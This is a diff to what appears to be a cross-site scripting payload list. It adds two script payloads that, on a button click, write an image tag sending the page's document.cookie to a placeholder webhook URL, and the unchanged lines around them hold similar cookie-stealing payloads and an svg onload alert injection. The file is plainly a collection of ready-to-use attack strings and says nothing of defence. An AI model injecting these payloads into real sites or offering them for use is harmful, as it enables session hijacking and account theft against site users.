@@ -10,4 +10,5 @@
 "><svg/onload=alert('hacked')>
 <script>document.write('<img src="enterwebhooksiteurl?c='+document.cookie+'" />')</script>
 "><script>document.write('<img src="enterwebhooksiteurl?c='+document.cookie+'" />')</script>
-<
+<script>document.getElementById("buttonID").addEventListener("click",function()=>{document.write('<img src="enterwebhooksiteurl?c='+document.cookie+'" />')})</script>
+"><script>document.getElementById("buttonID").addEventListener("click",function()=>{document.write('<img src="enterwebhooksiteurl?c='+document.cookie+'" />')})</script>
